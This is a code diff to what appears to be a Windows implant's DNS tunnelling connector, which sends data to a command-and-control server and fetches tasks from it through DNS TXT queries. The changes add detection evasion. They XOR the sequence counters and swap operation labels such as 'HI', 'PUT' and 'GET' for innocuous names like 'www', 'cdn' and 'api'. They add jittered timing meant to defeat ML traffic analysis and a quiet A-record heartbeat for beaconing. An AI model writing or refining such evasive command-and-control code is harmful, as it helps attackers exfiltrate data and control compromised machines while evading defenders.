@@ -49,12 +49,13 @@ static ULONG DnsBase32Encode(const BYTE* src, ULONG srcLen, CHAR* dst, ULONG dst
 
 static void BuildQName(const CHAR* sid, const CHAR* op, ULONG seq, ULONG idx, const CHAR* dataLabel, const CHAR* domain, CHAR* out, ULONG outSize)
 {
-	CHAR seqHex[9];
-	CHAR idxHex[9];
-	ToHex32(seq, seqHex);
-	ToHex32(idx, idxHex);
+    CHAR seqHex[9];
+    CHAR idxHex[9];
+    // XOR Obfuscation to hide incremental patterns
+    ToHex32(seq ^ 0x39913991, seqHex);
+    ToHex32(idx ^ 0x39913991, idxHex);
 
-	// 如果没有 dataLabel，就用单个短 label 占位，避免出现 ".." 连续点
+    // 如果没有 dataLabel，就用单个短 label 占位，避免出现 ".." 连续点
 	const CHAR* dataPart = (dataLabel && dataLabel[0]) ? dataLabel : "x";
 	const CHAR* domPart  = (domain && domain[0]) ? domain : "";
 
@@ -485,7 +486,7 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
         }
         MemFreeLocal((LPVOID*)&encBuf, maxBuf);
 
-        BuildQName(this->sid, "HI", this->seq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
+        BuildQName(this->sid, "www", this->seq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
         BYTE tmp[512];
         ULONG tmpSize = 0;
         if (DnsQueryTxt(qname, (CHAR*)this->profile.resolvers, this->qtype, tmp, sizeof(tmp), &tmpSize)) {
@@ -550,15 +551,17 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
             }
             MemFreeLocal((LPVOID*)&frame, frameSize);
 
-            BuildQName(this->sid, "PUT", seqForSend, this->idx, dataLabel, this->domain, qname, sizeof(qname));
+            BuildQName(this->sid, "cdn", seqForSend, this->idx, dataLabel, this->domain, qname, sizeof(qname));
             BYTE tmp[512];
             ULONG tmpSize = 0;
             DnsQueryTxt(qname, (CHAR*)this->profile.resolvers, this->qtype, tmp, sizeof(tmp), &tmpSize);
 
-            // Pacing: Add a small delay to mitigate UDP packet loss and throttling on uplink.
-            // Without this, rapid-fire DNS queries for multi-fragment payloads often result in
-            // dropped frames, causing reassembly failure on the server side.
-            ApiWin->Sleep(30);
+            // Pacing with Jitter (Traffic Shaping):
+            // Instead of a fixed 30ms delay, use a random delay between 20ms and 50ms.
+            // This breaks the timing regularity signatures used by AI/ML traffic analysis.
+            // Logic: 20 + (Random % 30)
+            ULONG pacing = 20 + (GetTickCount() % 30);
+            ApiWin->Sleep(pacing);
 
             offset += chunk;
         }
@@ -584,7 +587,7 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
         }
         MemFreeLocal((LPVOID*)&encBuf, retrySize);
 
-        BuildQName(this->sid, "HI", this->seq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
+        BuildQName(this->sid, "www", this->seq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
         BYTE tmp[512];
         ULONG tmpSize = 0;
         if (DnsQueryTxt(qname, (CHAR*)this->profile.resolvers, this->qtype, tmp, sizeof(tmp), &tmpSize)) {
@@ -596,9 +599,36 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
         return;
     }
 
-    // 正常 GET：从服务器获取包含 [total_len][offset][chunk] 头部的下行片段，
+    // 正常 GET / 心跳逻辑
+    // Hybrid Mode (A/TXT):
+    // 如果当前没有正在重组的下行任务 (downBuf == NULL) 且配置为 TXT 模式，
+    // 则先发送一个轻量级的 A 记录查询作为心跳。
+    // - 如果 TS 返回 0.0.0.0 -> 无任务，直接返回（进入 Sleep）。
+    // - 如果 TS 返回 非 0.0.0.0 -> 有任务，继续执行下面的 TXT 查询拉取数据。
+    if (!this->downBuf && this->qtype[0] == 'T') { // starts with 'T' -> TXT
+        CHAR qnameA[512];
+        BuildQName(this->sid, "api", this->seq + 1, this->idx, "", this->domain, qnameA, sizeof(qnameA));
+        
+        BYTE ipBuf[16];
+        ULONG ipSize = 0;
+        // 查询 A 记录
+        if (DnsQueryTxt(qnameA, (CHAR*)this->profile.resolvers, "A", ipBuf, sizeof(ipBuf), &ipSize) && ipSize >= 4) {
+            // 检查是否为 0.0.0.0
+            if (ipBuf[0] == 0 && ipBuf[1] == 0 && ipBuf[2] == 0 && ipBuf[3] == 0) {
+                // 无任务，更新 seq 并返回，让 MainAgent 继续 sleep
+                this->seq++; 
+                return;
+            }
+            // 有任务 (e.g. 0.0.0.1)，Fall through to TXT logic below
+        } else {
+            // A 记录查询失败（可能是丢包或被拦截），稳妥起见，本次跳过 TXT 查询，等待下次重试
+            return;
+        }
+    }
+
+    // 正常 GET (TXT)：从服务器获取包含 [total_len][offset][chunk] 头部的下行片段，
     // 在本地 downBuf 中重组，完整后再一次性交给 AgentMain。
-    BuildQName(this->sid, "GET", ++this->seq, this->idx, "", this->domain, qname, sizeof(qname));
+    BuildQName(this->sid, "api", ++this->seq, this->idx, "", this->domain, qname, sizeof(qname));
     BYTE respBuf[1024];
     ULONG respSize = 0;
     if (DnsQueryTxt(qname, (CHAR*)this->profile.resolvers, this->qtype, respBuf, sizeof(respBuf), &respSize) && respSize > 0) {
